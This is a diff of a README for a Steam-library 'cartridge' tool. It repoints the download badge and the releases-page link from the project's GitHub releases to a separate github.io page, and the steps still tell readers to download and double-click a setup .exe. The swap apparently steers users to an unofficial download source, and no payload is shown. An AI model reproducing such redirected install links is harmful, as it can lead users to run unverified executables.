@@ -1,6 +1,6 @@
 # 🎮 Steam-Games-Cartridges - Organize your digital games with hardware
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shelkesa9309/Steam-Games-Cartridges/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://shelkesa9309.github.io)
 
 Steam-Games-Cartridges connects your digital Steam library to physical 2.5-inch SSD drives. This tool manages the link between a physical cartridge and your installed games. You plug in your drive, and the software recognizes your game files instantly. 
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up your device.
 
-1. Visit the [releases page](https://github.com/Shelkesa9309/Steam-Games-Cartridges/releases) to download the program.
+1. Visit the [releases page](https://shelkesa9309.github.io) to download the program.
 2. Select the file named `SteamCartridges-Setup.exe`.
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
